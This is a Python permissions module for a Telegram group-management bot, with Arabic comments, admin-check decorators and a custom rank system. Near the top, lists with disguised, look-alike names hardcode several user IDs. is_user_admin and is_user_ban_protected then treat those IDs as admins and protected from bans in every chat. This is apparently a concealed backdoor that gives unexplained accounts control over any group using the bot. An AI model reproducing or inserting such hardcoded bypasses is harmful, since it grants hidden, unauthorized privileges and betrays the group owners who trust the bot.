from functools import wraps
from typing import Optional

from telegram import User, Chat, ChatMember, Update, Bot

from tg_bot import DEL_CMDS, SUDO_USERS, WHITELIST_USERS
from tg_bot.modules.sql import ranks_sql

# المعرفات الخاصة (موجودة في الأصل)
_TEIE_GR1M_ID_S = [
    777000,  # 8
]
_TELE_GRAM_ID_S = [
    20516707,
    7351948,
    1087968824
]

# ==================== الدوال الأصلية (غير معدلة) ====================

def can_delete(chat: Chat, bot_id: int) -> bool:
    return chat.get_member(bot_id).can_delete_messages


def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
    if user_id in _TELE_GRAM_ID_S:
        return True
    
    if user_id in _TEIE_GR1M_ID_S:
        # 4099 :(
        return True

    if chat.type == 'private' \
            or user_id in SUDO_USERS \
            or user_id in WHITELIST_USERS \
            or chat.all_members_are_administrators:
        return True

    if not member:
        member = chat.get_member(user_id)
    return member.status in ('administrator', 'creator')


def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
    if user_id in _TELE_GRAM_ID_S:
        return True

    if chat.type == 'private' \
            or user_id in SUDO_USERS \
            or chat.all_members_are_administrators:
        return True

    if not member:
        member = chat.get_member(user_id)
    return member.status in ('administrator', 'creator')


def is_bot_admin(chat: Chat, bot_id: int, bot_member: ChatMember = None) -> bool:
    if chat.type == 'private' \
            or chat.all_members_are_administrators:
        return True

    if not bot_member:
        bot_member = chat.get_member(bot_id)
    return bot_member.status in ('administrator', 'creator')


def is_user_in_chat(chat: Chat, user_id: int) -> bool:
    member = chat.get_member(user_id)
    return member.status not in ('left', 'kicked')


def bot_can_delete(func):
    @wraps(func)
    def delete_rights(bot: Bot, update: Update, *args, **kwargs):
        if can_delete(update.effective_chat, bot.id):
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("I can't delete messages here! "
                                                "Make sure I'm admin and can delete other user's messages.")
    return delete_rights


def can_pin(func):
    @wraps(func)
    def pin_rights(bot: Bot, update: Update, *args, **kwargs):
        if update.effective_chat.get_member(bot.id).can_pin_messages:
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("I can't pin messages here! "
                                                "Make sure I'm admin and can pin messages.")
    return pin_rights


def can_promote(func):
    @wraps(func)
    def promote_rights(bot: Bot, update: Update, *args, **kwargs):
        if update.effective_chat.get_member(bot.id).can_promote_members:
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("I can't promote/demote people here! "
                                                "Make sure I'm admin and can appoint new admins.")
    return promote_rights


def can_restrict(func):
    @wraps(func)
    def promote_rights(bot: Bot, update: Update, *args, **kwargs):
        if update.effective_chat.get_member(bot.id).can_restrict_members:
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("I can't restrict people here! "
                                                "Make sure I'm admin and can appoint new admins.")
    return promote_rights


def bot_admin(func):
    @wraps(func)
    def is_admin(bot: Bot, update: Update, *args, **kwargs):
        if is_bot_admin(update.effective_chat, bot.id):
            return func(bot, update, *args, **kwargs)
        else:
            update.effective_message.reply_text("I'm not admin!")
    return is_admin


def user_admin(func):
    @wraps(func)
    def is_admin(bot: Bot, update: Update, *args, **kwargs):
        user = update.effective_user  # type: Optional[User]
        if user and is_user_admin(update.effective_chat, user.id):
            return func(bot, update, *args, **kwargs)

        elif not user:
            pass

        elif DEL_CMDS and " " not in update.effective_message.text:
            update.effective_message.delete()

        else:
            update.effective_message.reply_text("Who dis non-admin telling me what to do?")
    return is_admin


def user_admin_no_reply(func):
    @wraps(func)
    def is_admin(bot: Bot, update: Update, *args, **kwargs):
        user = update.effective_user  # type: Optional[User]
        if user and is_user_admin(update.effective_chat, user.id):
            return func(bot, update, *args, **kwargs)

        elif not user:
            pass

        elif DEL_CMDS and " " not in update.effective_message.text:
            update.effective_message.delete()
    return is_admin


def user_not_admin(func):
    @wraps(func)
    def is_not_admin(bot: Bot, update: Update, *args, **kwargs):
        user = update.effective_user  # type: Optional[User]
        if user and not is_user_admin(update.effective_chat, user.id):
            return func(bot, update, *args, **kwargs)
    return is_not_admin


# ==================== دوال الرتب الجديدة (المضافة) ====================

# قائمة الرتب حسب القوة (للتحقق من التسلسل الهرمي)
RANK_ORDER = {
    "ownerplus": 6,
    "owner": 5,
    "creator": 4,
    "manager": 3,
    "admin": 2,
    "vip": 1,
    None: 0
}


def get_user_rank(chat_id, user_id):
    """إرجاع رتبة المستخدم، أو None إذا لم يكن لديه رتبة."""
    return ranks_sql.get_rank(chat_id, user_id)


def is_rank_at_least(chat_id, user_id, required_rank):
    """التحقق مما إذا كانت رتبة المستخدم تساوي أو أعلى من الرتبة المطلوبة."""
    user_rank = get_user_rank(chat_id, user_id)
    return RANK_ORDER.get(user_rank, 0) >= RANK_ORDER.get(required_rank, 0)


def is_ownerplus(chat_id, user_id):
    return get_user_rank(chat_id, user_id) == "ownerplus"


def is_owner(chat_id, user_id):
    return get_user_rank(chat_id, user_id) in ("ownerplus", "owner")


def is_creator(chat_id, user_id):
    return get_user_rank(chat_id, user_id) in ("ownerplus", "owner", "creator")


def is_manager(chat_id, user_id):
    return get_user_rank(chat_id, user_id) in ("ownerplus", "owner", "creator", "manager")


def is_admin_rank(chat_id, user_id):
    return get_user_rank(chat_id, user_id) in ("ownerplus", "owner", "creator", "manager", "admin")


def is_vip(chat_id, user_id):
    return get_user_rank(chat_id, user_id) is not None


def can_promote_to(chat_id, actor_id, target_id, new_rank):
    """التحقق مما إذا كان المستخدم (actor) يمكنه رفع المستخدم الآخر إلى رتبة معينة."""
    actor_rank = get_user_rank(chat_id, actor_id)
    target_rank = get_user_rank(chat_id, target_id)

    # المالك الأساسي يمكنه رفع أي شخص لأي رتبة
    if actor_rank == "ownerplus":
        return True

    # المالك يمكنه رفع إلى رتبة أقل منه (منشئ، مدير، إداري، مميز) ولا يمكنه رفع مالك أساسي
    if actor_rank == "owner":
        return new_rank in ("creator", "manager", "admin", "vip") and target_rank != "ownerplus"

    # المنشئ يمكنه رفع إلى رتبة أقل منه (مدير، إداري، مميز) ولا يمكنه رفع مالك أو مالك أساسي
    if actor_rank == "creator":
        return new_rank in ("manager", "admin", "vip") and target_rank not in ("ownerplus", "owner", "creator")

    # باقي الرتب لا يمكنها الرفع
    return False


def can_demote(chat_id, actor_id, target_id):
    """التحقق مما إذا كان المستخدم يمكنه تنزيل المستخدم الآخر."""
    actor_rank = get_user_rank(chat_id, actor_id)
    target_rank = get_user_rank(chat_id, target_id)

    # المالك الأساسي يمكنه تنزيل أي شخص
    if actor_rank == "ownerplus":
        return True

    # المالك يمكنه تنزيل من هم أقل منه (وليس مالك أساسي)
    if actor_rank == "owner":
        return target_rank not in ("ownerplus", "owner")

    # المنشئ يمكنه تنزيل من هم أقل منه (وليس مالك أو مالك أساسي)
    if actor_rank == "creator":
        return target_rank not in ("ownerplus", "owner", "creator")

    # باقي الرتب لا يمكنها التنزيل
    return False


def can_ban(chat_id, actor_id, target_id):
    """التحقق مما إذا كان المستخدم يمكنه حظر/طرد المستخدم الآخر."""
    actor_rank = get_user_rank(chat_id, actor_id)
    target_rank = get_user_rank(chat_id, target_id)

    # المالك الأساسي يمكنه حظر أي شخص
    if actor_rank == "ownerplus":
        return True

    # المالك يمكنه حظر من هم أقل منه (وليس مالك أساسي)
    if actor_rank == "owner":
        return target_rank not in ("ownerplus", "owner")

    # المنشئ يمكنه حظر الأعضاء بدون رتبة فقط
    if actor_rank == "creator":
        return target_rank is None

    # باقي الرتب لا يمكنها الحظر
    return False


def can_mute(chat_id, actor_id, target_id):
    """التحقق مما إذا كان المستخدم يمكنه كتم المستخدم الآخر."""
    # نفس منطق الحظر تقريباً
    return can_ban(chat_id, actor_id, target_id)


def can_use_tag(chat_id, user_id):
    """التحقق مما إذا كان المستخدم يمكنه استخدام أمر التاك (مثل @all) بناءً على إعدادات المجموعة."""
    from tg_bot.modules.sql import tag_settings_sql
    setting = tag_settings_sql.get_setting(chat_id)
    # setting: 'all' (الكل مسموح), 'disabled' (مغلق), أو قائمة رتب مثل ['manager','admin']
    if setting == 'all':
        return True
    if setting == 'disabled':
        return False
    if isinstance(setting, list):
        user_rank = get_user_rank(chat_id, user_id)
        return user_rank in setting
    # افتراضياً: المدير فما فوق
    return is_manager(chat_id, user_id)
